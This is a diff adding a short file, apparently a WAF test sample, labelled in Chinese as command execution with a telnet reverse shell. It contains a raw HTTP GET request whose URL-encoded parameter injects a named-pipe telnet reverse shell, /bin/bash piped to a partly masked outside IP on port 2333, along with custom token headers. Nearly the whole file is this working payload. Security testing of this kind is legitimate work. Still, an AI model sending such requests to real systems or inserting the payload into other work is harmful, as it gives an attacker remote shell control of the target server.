@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507071
+# telnet反弹shell
+GET /?id=mknod%20a%20p%3B%20telnet%2047.xxx.xxx.72%202333%200%3Ca%20%7C%20%2Fbin%2Fbash%201%3Ea&bid=hd_tag_m8mv25yl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yl
+RM-PRO-Token: 349906058ecc7206f1ef6d967d959dd1
+RM-PRO-Time: 1742808514250
+User-Agent: curl/7.83.1
+
